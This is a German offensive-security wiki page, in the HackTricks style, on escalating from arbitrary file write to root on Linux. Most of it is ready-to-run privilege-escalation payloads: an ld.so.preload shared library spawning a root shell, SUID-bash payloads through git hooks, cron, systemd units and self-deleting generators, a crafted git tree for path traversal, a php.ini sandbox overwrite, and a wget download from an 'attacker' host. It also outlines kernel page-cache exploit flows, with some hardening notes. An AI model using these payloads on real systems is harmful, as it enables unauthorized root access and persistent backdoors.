# Beliebiges Schreiben in Dateien als Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ist eine systemweite Liste von Shared Objects, die der dynamische Linker vor anderen Shared Objects lädt. Der Secure-Execution-Modus wendet zusätzliche Einschränkungen auf das Preloading an, daher ist ein Bibliothekspfad wie `/tmp/pe.so` keine universelle Technik für SUID-Binaries.\
Wenn du die Datei erstellen oder ändern kannst, lädt ein Prozess, der die Datei lädt, die aufgeführte Bibliothek vor seinen anderen Shared Objects und ermöglicht so die Codeausführung im Kontext dieses Prozesses.<sup>[[12]](#references)</sup>

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** sind ausführbare Skripte, die bei Ereignissen in einem Repository ausgeführt werden, einschließlich Commit- und Merge-Vorgängen. Wenn ein **privileged script oder user** diese Aktionen ausführt und ein Angreifer in den **`.git`-Ordner schreiben** kann, kann der Hook für **privilege escalation** verwendet werden.<sup>[[13]](#references)</sup>

Zum Beispiel ist es möglich, ein **Skript** in einem Git-Repo unter **`.git/hooks`** zu **erstellen**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Path Traversal beim privilegierten Git-Tree-Export

Ein privilegierter Synchronizer kann einen checkout vermeiden und stattdessen ein von einem Angreifer beeinflusstes Repository mit `git ls-tree` enumerieren, jeden Blob mit `git cat-file` lesen, den gemeldeten Pfad mit einem Staging-Verzeichnis verbinden und die Datei selbst schreiben. Dies wird zu einem **beliebigen Dateischreibzugriff mit den Berechtigungen des Synchronizers**, wenn `-c safe.directory=*` (wodurch die Git-Schutzfunktion für Repositories mit anderem Eigentümer deaktiviert wird) mit fehlender Prüfung auf Begrenzung innerhalb des Zielverzeichnisses kombiniert wird. Ein absoluter Tree-Entry-Name bewirkt, dass Python bei `os.path.join(stage, name)` `stage` verwirft; ein relativer Name mit `../` entkommt, sobald das Dateisystem ihn auflöst. Da die Anwendung den rohen Tree materialisiert, anstatt Git mit dem checkout zu beauftragen, schützt die Pfadnamenvalidierung zur checkout-Zeit das Ziel nicht.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Suche in Root-Diensten, Timern, Deployment-Agents, Template-Importern und Backup-/Restore-Jobs nach dieser Code-Struktur:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Ein Tree-Eintrag wird als `<mode> SP <name> NUL <raw object ID>` codiert. Die Option `git hash-object --literally` erlaubt absichtlich Objektdaten, die beim normalen Parsen oder von `git fsck` abgelehnt werden könnten, sodass ein Wegwerf-Klon einen Tree erstellen kann, dessen Dateiname ein absolutes Ziel ist. Dieses Beispiel erstellt ein Blob für eine Cron-Datei, verpackt den manipulierten Tree in einen Commit und verschiebt einen Branch darauf; für die Ausnutzung sind weiterhin Berechtigungen zum Aktualisieren eines von dem privilegierten Job verwendeten Repositorys sowie ein Git-Server erforderlich, der das fehlerhafte Objekt akzeptiert.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Die Absicherung muss sowohl die Aufnahme in das Repository als auch die abschließende Dateisystemoperation abdecken:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Ersetze `safe.directory=*` durch die exakten Repositories, denen der Dienst vertrauen muss, und führe die Repository-Verarbeitung nach Möglichkeit ohne Root-Rechte aus.
- Lehne absolute Namen sowie alle `.`- oder `..`-Komponenten vor der Materialisierung ab. Kanonisiere das Ziel nach dem Zusammenfügen und überprüfe, dass es weiterhin unterhalb des vorgesehenen Stammverzeichnisses liegt.
- Vermeide Symlink-Races nach dem Muster „prüfen und anschließend öffnen“: Öffne relativ zu einem vertrauenswürdigen Verzeichnis-Descriptor und verwende unter Linux für vom Angreifer kontrollierte Pfade `openat2()` mit `RESOLVE_BENEATH` und `RESOLVE_NO_SYMLINKS`.
- Bevorzuge einen normalen Checkout in einem isolierten Verzeichnis gegenüber einer eigenen Neuimplementierung des Checkouts anhand von Plumbing-Ausgaben. Wenn die Aufnahme von Raw-Objekten erforderlich ist, aktiviere die Validierung auf der Receive-Seite, beispielsweise mit `receive.fsckObjects=true`; stufe die pfadbezogenen `receive.fsck.*`-Befunde, die zum Ablehnen manipulierter Trees erforderlich sind, nicht herab.

### Cron- und Zeitdateien

Wenn du **cron-bezogene Dateien schreiben kannst, die von Root ausgeführt werden**, kannst du beim nächsten Ausführen des Jobs normalerweise Code Execution erreichen. Interessante Ziele sind unter anderem:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Die eigene Crontab von Root in `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd`-Timer und die von ihnen ausgelösten Services

Schnellprüfungen:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typische Missbrauchswege:

- **Einen neuen root-Cronjob anhängen** an `/etc/crontab` oder eine Datei in `/etc/cron.d/`
- **Ein Script ersetzen**, das bereits von `run-parts` ausgeführt wird
- **Ein bestehendes Timer-Ziel mit einer Backdoor versehen**, indem das von ihm gestartete Script oder Binary geändert wird

Minimales Beispiel für ein Cron-Payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Wenn du nur in ein von `run-parts` verwendetes Cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notizen:

- `run-parts` ignoriert normalerweise Dateinamen, die Punkte enthalten. Verwende daher vorzugsweise Namen wie `backup` statt `backup.sh`.<sup>[[15]](#references)</sup>
- Einige Systeme verwenden `systemd`-Timer anstelle des klassischen cron, aber die Idee des Missbrauchs ist dieselbe: **ändern, was root später ausführen wird**.<sup>[[20]](#references)</sup>

### Service- und Socket-Dateien

Wenn du **`systemd`-Unit-Dateien** oder von ihnen referenzierte Dateien schreiben kannst, kannst du möglicherweise durch das Neuladen und Neustarten der Unit oder durch das Warten auf das Auslösen des Service-/Socket-Aktivierungspfads code execution als root erreichen.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service-Skripte/-Binärdateien, auf die von `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwiesen wird
- Schreibbare `EnvironmentFile=`-Pfade, die von einem root-Service geladen werden

Schnellprüfungen:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Häufige Missbrauchspfade:

- **`ExecStart=` überschreiben** in einer Root-eigenen Service-Unit, die du ändern kannst
- **Einen Drop-in-Override hinzufügen** mit einem bösartigen `ExecStart=` und zuvor den alten Wert leeren
- **Das bereits von der Unit referenzierte Script/Binary mit einer Backdoor versehen**
- **Einen socket-aktivierten Service hijacken**, indem du die entsprechende `.service`-Datei änderst, die gestartet wird, wenn der Socket eine Verbindung empfängt

Beispiel für einen bösartigen Override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typischer Aktivierungsablauf:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Wenn du Services nicht selbst neu starten kannst, aber eine Socket-aktivierte Unit bearbeiten kannst, musst du möglicherweise nur **auf eine Client-Verbindung warten**, um die Ausführung des mit einer Backdoor versehenen Services als root auszulösen.<sup>[[17]](#references)</sup>

### systemd-Generator-Verzeichnisse

**System generators** sind ausführbare Dateien, die vom Systemmanager gestartet werden, bevor er Unit-Dateien lädt, sowohl während des Bootens als auch beim Neuladen der Konfiguration. Daher ist Schreibzugriff auf ein System-generator-Verzeichnis (oder auf einen vorhandenen ausführbaren Generator) eine direkte Primitive zur Codeausführung als root, die leicht übersehen wird, wenn ein Audit nur `*.service`- und `*.timer`-Dateien prüft.<sup>[[35]](#references)[[36]](#references)</sup>

Die übliche Suchreihenfolge ist `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` und `/usr/lib/systemd/system-generators/` (einige Distributionen stellen `/lib/systemd/system-generators/` über den `/usr`-Merge bereit). Eine ausführbare Datei mit demselben Namen in einem früheren Verzeichnis überschreibt die spätere. Verwechsle diese **Verzeichnisse für ausführbare Eingabedateien** nicht mit `/run/systemd/generator`, `/run/systemd/generator.early` und `/run/systemd/generator.late`, die transiente Unit-Ausgaben enthalten, die von Generatoren erzeugt wurden.<sup>[[35]](#references)</sup>

Schnellprüfungen:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Ein neu erstellter Generator muss über das executable bit verfügen. Wenn die write primitive Bytes, aber nicht den mode kontrolliert, ziele auf einen bereits ausführbaren Generator; ihn an Ort und Stelle zu truncaten, erhält normalerweise seine Metadaten. Wenn das Verzeichnis selbst beschreibbar ist, erstelle einen neuen Eintrag und markiere ihn als ausführbar.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Das Auslösen von `systemctl daemon-reload` für den **system** manager erfordert eine geeignete Autorisierung, führt jedoch jeden system generator erneut aus; andernfalls muss auf einen privilegierten Reload, einen Paketvorgang oder einen Neustart gewartet werden. User-generator-Verzeichnisse wie `~/.config/systemd/user-generators/` werden unter dem user manager ausgeführt und gewähren für sich allein keinen Zugriff als root.<sup>[[35]](#references)</sup>

Für Hardening und die Suche nach Auffälligkeiten sollte jeder Pfadbestandteil und jede ACL überprüft werden, statt nur die abschließenden Mode-Bits zu kontrollieren. Außerdem sollten Hashes und der Paketbesitz der Generatoren als Baseline erfasst und Erstellungs-, Umbenennungs-, Inhalts- oder Berechtigungsänderungen in allen system-generator-Eingabeverzeichnissen gemeldet werden. Die Überwachung des Schreibvorgangs ist wichtig, da sich ein One-Shot-Generator nach der Ausführung selbst löschen kann, während der generierte Unit-Baum unter `/run/systemd/generator*` beim nächsten Reload neu erstellt wird.<sup>[[35]](#references)[[36]](#references)</sup>

### Eine restriktive `php.ini` überschreiben, die von einer privilegierten PHP-Sandbox verwendet wird

Einige benutzerdefinierte Daemons validieren von Benutzern bereitgestelltes PHP, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel `disable_functions=exec,system,...`). Wenn der Sandbox-Code weiterhin über **irgendeine Schreibmöglichkeit** (wie `file_put_contents`) verfügt und du den **genauen `php.ini`-Pfad** erreichen kannst, der vom Daemon verwendet wird, kannst du diese **Konfiguration überschreiben**, um die Einschränkungen aufzuheben, und anschließend eine zweite Payload übermitteln, die mit erweiterten Berechtigungen ausgeführt wird.<sup>[[2]](#references)</sup>

Typischer Ablauf:

1. Die erste Payload überschreibt die Sandbox-Konfiguration.
2. Die zweite Payload führt Code aus, nachdem gefährliche Funktionen wieder aktiviert wurden.

Minimales Beispiel (den vom Daemon verwendeten Pfad ersetzen):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Wenn der Daemon als root läuft (oder mit root-eigenen Pfaden validiert), liefert die zweite Ausführung einen root-Kontext. Dies ist im Wesentlichen **Privilege Escalation via Config Overwrite**, wenn die Sandbox-Laufzeit weiterhin Dateien schreiben kann.

### binfmt_misc

`binfmt_misc` stellt Registrierungen unter `/proc/sys/fs/binfmt_misc` bereit; jede Registrierung ordnet einem Dateityp-Muster einen Interpreter zu. Die Auswirkungen auf die Berechtigungen hängen davon ab, wer die Registrierung ändern kann und welcher Prozess später die passende Datei ausführt. Überprüfe diese Voraussetzungen daher, bevor du dies als möglichen Privilege-Escalation-Pfad betrachtest.<sup>[[21]](#references)</sup>

### Schema-Handler überschreiben (wie http: oder https:)

Desktop-Umgebungen verwenden MIME-Zuordnungen und Desktop-Entries, um eine Anwendung für URI-Schemata auszuwählen. Ein Angreifer, der in die relevanten Konfigurations- und Desktop-Entry-Verzeichnisse des Benutzers schreiben kann, kann diese Schemata an einen von ihm kontrollierten Launcher umleiten. Durch Ändern der Datei `$HOME/.config/mimeapps.list`, sodass HTTP- und HTTPS-URL-Handler auf eine bösartige Datei zeigen (zum Beispiel `x-scheme-handler/http=evil.desktop` und `x-scheme-handler/https=evil.desktop`), kann ein Benutzerklick diesen Desktop-Entry aufrufen.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root führt von Benutzern beschreibbare Skripte/Binärdateien aus

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` ausführt (oder eine beliebige Binärdatei innerhalb eines Verzeichnisses, das einem unprivilegierten Benutzer gehört), kannst du es übernehmen:<sup>[[1]](#references)</sup>

- **Die Ausführung erkennen:** Überwache Prozesse mit pspy, um zu erfassen, wann root benutzergesteuerte Pfade aufruft.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören bzw. für ihn beschreibbar sind.
- **Ziel hijacken:** Sichere die ursprüngliche Binärdatei/das ursprüngliche Script und hinterlege ein Payload, das eine SUID-Shell (oder eine andere Root-Aktion) erstellt, anschließend stelle die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Die privilegierte Aktion auslösen** (z. B. eine UI-Schaltfläche drücken, die den Helper startet). Wenn root den hijackten Pfad erneut ausführt, die eskalierte Shell mit `./rootshell -p` übernehmen.

### Nur im Page Cache vorgenommene Dateimodifikation privilegierter Binaries

Einige Kernel-Bugs modifizieren die Datei **nicht auf der Festplatte**. Stattdessen ermöglichen sie lediglich die Modifikation der **Page-Cache-Kopie** einer lesbaren Datei. Wenn ein **setuid**- oder anderweitig **von root ausgeführtes** Binary betroffen ist, kann die nächste Ausführung vom Angreifer kontrollierte Bytes aus dem Speicher ausführen und die Privilegien eskalieren, obwohl der Datei-Hash auf der Festplatte unverändert ist.<sup>[[3]](#references)[[4]](#references)</sup>

Dies lässt sich als **nur zur Laufzeit vorhandene File-Write-Primitive** verstehen:<sup>[[3]](#references)</sup>

- **Die Festplatte bleibt unverändert**: Der Inode und die Bytes auf der Festplatte ändern sich nicht
- **Der Speicher ist verändert**: Prozesse, die die gecachte Page lesen oder ausführen, erhalten den vom Angreifer modifizierten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Neustart oder der Verdrängung aus dem Cache

Diese Primitive liegt zwischen einem klassischen **arbitrary file write** und älteren **Page-Cache-Abuse**-Bugs wie Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW war auf eine Race Condition angewiesen
- Dirty Pipe hatte Einschränkungen hinsichtlich der Schreibposition
- Eine ausschließlich auf den Page Cache gerichtete Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Schreibzugriffe in gecachte, dateigestützte Pages ermöglicht

#### Allgemeiner Privesc-Ablauf

1. Eine Kernel-Primitive erlangen, die in **dateigestützte Page-Cache-Pages** schreiben kann
2. Sie gegen ein **lesbares privilegiertes Binary** oder eine andere von root ausgeführte Datei einsetzen
3. Die Ausführung **auslösen, bevor** die Page aus dem Cache verdrängt wird
4. Codeausführung als root erhalten, während die Datei auf der Festplatte weiterhin unverändert aussieht

Typische hochwertige Ziele:

- **setuid-root**-Binaries
- Helper, die von **root-Services** gestartet werden
- Binaries, die häufig aus **Containern mit gemeinsamem Host-Kernel/Page Cache** ausgeführt werden

#### AF_ALG + `splice()`-Beispielpfad

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad befand sich in der Linux-Crypto-Userspace-API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kann Referenzen auf Page-Cache-Pages aus einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- der In-Place-`algif_aead`-Decrypt-Pfad verwendete Source- und Destination-Buffer erneut
- `authencesn` schrieb anschließend in die Destination-Tag-Region
- wenn diese Region weiterhin auf gesplice-te dateigestützte Pages verwies, erfolgte der Schreibvorgang im **Page Cache der Zieldatei**

Die interessante Technik ist daher nicht die CVE selbst, sondern das Muster:

- **dateigestützte Cache-Pages in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als beschreibbaren Output zu **behandeln**
- eine kleine kontrollierte Überschreibung im Speicher auslösen

Der öffentliche PoC verwendete wiederholte **4-Byte-Schreibvorgänge**, um `/usr/bin/su` im Speicher zu patchen und anschließend auszuführen.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + Netfilter-TEE-Clone-Beispielpfad

DirtyClone (CVE-2026-43503) zeigt eine weitere Variante desselben **page-cache-only write-to-root**-Musters, diesmal jedoch mit **IPsec-ESP-Decryption** anstelle von `AF_ALG` als Sink.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die wichtige Technik ist der Schritt des **Metadata-Laundering**:

- `splice()` platziert eine **read-only dateigestützte Page-Cache-Page** in einem ESP-in-UDP-Paket
- die ursprüngliche DirtyFrag-Mitigation markierte das skb mit `SKBFL_SHARED_FRAG`, damit `esp_input()` vor der Decryption **kopierte**
- Netfilter `TEE` dupliziert das Paket über `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- der Clone behält dieselbe **physische Page-Cache-Referenz**, verliert jedoch `SKBFL_SHARED_FRAG`
- `esp_input()` behandelt den Clone anschließend als sicher und führt die **In-Place-`cbc(aes)`-Decryption** über die dateigestützte Page aus

Die Lehre für Reviewer geht daher über die CVE hinaus: Wenn eine Mitigation von **skb-/Page-Metadaten** abhängt, um zu entscheiden, ob zunächst kopiert werden muss, kann jeder **Clone-/Copy-Pfad, der die zugrunde liegende Page beibehält, aber die Metadaten entfernt**, die Write-Primitive unbemerkt erneut ermöglichen.

Typischer Exploit-Ablauf:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, um **`CAP_NET_ADMIN` innerhalb eines privaten Network-Namespace** zu erhalten
2. Loopback aktivieren und eine **Netfilter-`TEE`-Regel** in `mangle/OUTPUT` installieren
3. **XFRM-ESP-Transport-SAs** über `NETLINK_XFRM` installieren
4. jedes Ziel-4-Byte-Word im SA-Feld `seq_hi` kodieren (DirtyFrags Trick zur Word-Auswahl)
5. das gesplice-te ESP-in-UDP-Paket senden, sodass der **TEE-Clone** `esp_input()` erreicht und die Decryption **In-Place** ausführt
6. wiederholen, bis die Page-Cache-Kopie von `/usr/bin/su` oder einer anderen privilegierten ausführbaren Datei vom Angreifer kontrollierten Code enthält

Operativ ist die Auswirkung dieselbe wie im `AF_ALG`-Beispiel: Die Datei auf der Festplatte bleibt unverändert, aber `execve()` verwendet die **mutierten Page-Cache-Bytes** und liefert root.<sup>[[8]](#references)[[9]](#references)</sup>

Nützliche Exposure-Checks für diese Variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Die kurzfristige Reduzierung der Angriffsfläche ist auch hier pfadspezifisch: Ein Upgrade auf einen Kernel mit `48f6a5356a33` behebt den clone path, während das Blockieren des automatischen Ladens von `xt_TEE` den **Schritt zur Verschleierung von Flags** entfernt und das Blockieren von `esp4` / `esp6` den **Entschlüsselungs-Sink** entfernt.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposition und Suche

Wenn du diese Fehlerklasse vermutest, verlasse dich nicht nur auf Prüfungen der Festplattenintegrität. Überprüfe außerdem:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Die folgenden Konfigurationswerte unterscheiden zwischen einem ladbaren Interface und einem im Kernel integrierten Interface; die crypto build rules ordnen `CONFIG_CRYPTO_USER_API_AEAD` `algif_aead` zu.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul geladen und entladen werden
- `CONFIG_CRYPTO_USER_API_AEAD=y`: das Interface ist in den Kernel integriert
- setuid-Binaries sind gute Ziele, da ein Patch, der nur den Page Cache betrifft, ausreichen kann, um einen lokalen foothold in root umzuwandeln

#### Reduzierung der Angriffsfläche für den Pfad `algif_aead`

Wenn das verwundbare Interface von einem ladbaren Modul bereitgestellt wird:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Wenn es in den Kernel kompiliert wird, berichteten einige Meldungen, dass der init-Pfad blockiert wurde:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Diese Art der Mitigation sollte auch bei anderen Kernel-LPEs berücksichtigt werden: Wenn die Exploitation von einer bestimmten optionalen Schnittstelle abhängt, kann das Deaktivieren oder Blacklisting dieser Schnittstelle den Exploit-Pfad unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – Hijacking eines als root ausgeführten Scripts in einem benutzerbeschreibbaren PaperCut-Verzeichnis](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security-Veröffentlichung zu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux-Stable-Fix: crypto: algif_aead – Rückkehr zum Betrieb out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail – CVE-2026-31431 Advisory](https://copy.fail/)
- [7] [Technischer Write-up von Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-Repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Analyse und Exploitation der Linux-LPE-Variante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-Fix: net: skb: `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` beibehalten (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Frühere Linux-Mitigation: `SKBFL_SHARED_FRAG` für gesplicete UDP-Pakete setzen (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git-Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) – Debian-Handbuchseite](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc – Die Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Zuordnungen von MIME-Anwendungen](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Spezifikation für gemeinsame MIME-Informationen](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Spezifikation für Desktop-Einträge](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-Sprache](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux-Crypto-Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: AF_ALG-Page-Cache-Schwachstelle im Linux-Kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf – HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git-Dokumentation zu `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Git-Dokumentation zu `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Git-Konfigurationsdokumentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` – Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentation zu systemd-Generatoren](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs – Linux Detection Engineering: Persistenzmechanismen](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
